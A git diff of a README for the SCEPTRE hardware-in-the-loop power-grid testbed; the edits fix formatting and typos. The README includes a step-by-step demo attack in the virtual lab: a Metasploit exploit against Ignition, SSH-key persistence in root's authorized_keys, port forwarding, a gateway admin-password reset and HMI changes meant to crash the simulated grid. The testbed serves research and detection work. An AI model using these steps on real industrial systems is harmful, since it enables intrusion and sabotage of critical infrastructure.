@@ -1,6 +1,6 @@
 This repository contains a topology to demonstrate the Hardware-In-the-Loop (HIL) capabilities of SCEPTRE. The topology is based on the original SOAP (SCEPTRE on a Platter) topology and underlying power model, simulated using PyPower. It includes the integration of a Siemens S7 PLC as HIL, functioning as a simple controller in the power model. _This topology also still fully functions without HIL and can be used by selecting a second, "virtual-only" control screen that is already included in the HMI configuration._
 
-In addition to the topology, this repo includes a demo attack against the PLC to manipulate and destablize the power system model. In addition, a SCORCH pipeline is included in the scenario which can be used to captur raw PCAP to exportable files, and packet metadata (via filebeat and [Zeek](zeek.org)) to an elastic instance.
+In addition to the topology, this repo includes a demo attack against the PLC to manipulate and destablize the power system model. Finally, a SCORCH pipeline is included in the scenario which can be used to capture raw PCAP to exportable files, and packet metadata (via filebeat and [Zeek](zeek.org)) to an elastic instance.
 
 
 # Getting Started
@@ -183,26 +183,28 @@ python3 plc-attack.py <STARTUP_DELAY_SECONDS> <NUMBER_REPEATS>
 ### Running an attack scenario in virtual-only mode
 A sample 'attack' is implemented through a few means to demonstrate SCEPTRE without a Hardware-In-The-Loop implementation.
 1. After launching the experiment, enter the `attacker` machine and launch `msfconsole`
-* Start by finding the applicable exploit `search ignition`
-* Select the first exploit `use 3`
-* Set the required options, the RHOSTS, LHOST, and PythonPath
-    `set RHOSTS 10.117.4.70`
-    `set LHOST 10.117.4.169`
-    `set PythonPath python3`
-* Run the exploit `exploit`
+   * Start by finding the applicable exploit `search ignition`
+   * Select the first exploit `use 3`
+   * Set the required options, the RHOSTS, LHOST, and PythonPath
+       ```bash
+       set RHOSTS 10.117.4.70
+       set LHOST 10.117.4.169
+       set PythonPath python3
+       ```
+   * Run the exploit `exploit`
 2. Add ssh keys to maintain persistence
-* On your host machine `ssh-keygen` to generate a new ssh key
-* In your metasploit session use `echo '[SSH-KEY]' > /root/.ssh/authorized_keys (you may need to create the .ssh directory)
+   * On your host machine `ssh-keygen` to generate a new ssh key
+   * In your metasploit session use `echo '[SSH-KEY]' > /root/.ssh/authorized_keys (you may need to create the .ssh directory)
 3. Use port forwarding to get ignition designer
-* Use SSH to open a tunnel to the ignition machine `ssh root@10.117.4.70 -L 9999:localhost:8088`
-* Download the ignition designer from localhost:9999
+   * Use SSH to open a tunnel to the ignition machine `ssh root@10.117.4.70 -L 9999:localhost:8088`
+   * Download the ignition designer from localhost:9999
 4. Use your SSH session to restart the ignition password
-* On the ssh session `gwcmd --passwd` and reset the gateway `gwcmd -r`
-* Refresh your ignition webpage to reset the admin password
+   * On the ssh session `gwcmd --passwd` and reset the gateway `gwcmd -r`
+   * Refresh your ignition webpage to reset the admin password
 5. Connect to iginition HMI
-* Log in to the Ignition Designer application
-* Open the soap_hil-virt HMI
-* Change random settings on the HMI to crash the Power system
+   * Log in to the Ignition Designer application
+   * Open the soap_hil-virt HMI
+   * Change random settings on the HMI to crash the Power system
 
 
 ### Scorch Test
@@ -220,7 +222,7 @@ Check your elasticstack deployment to validate that zeek is ingesting packets pr
 4. When finished, open the `exp-break` breakpoint and exit the terminal to allow the pipeline to continue:
 
     ![alt text](img/scorch-break-exit.png)
-5. At this point the pipeline should complete and you can go back to `Files` tab of the main experiment page do view and download artifacts from the Scorch run:
+5. At this point the pipeline should complete and you can go back to `Files` tab of the main experiment page to view and download artifacts from the Scorch run:
     ![alt text](img/scorch-artifacts.png)
 6. If you have configured Elasticsearch/kibana, you can also view the captured packet metadata through the Kibana interface:
     ![alt text](img/kibana-packet-meta.png)
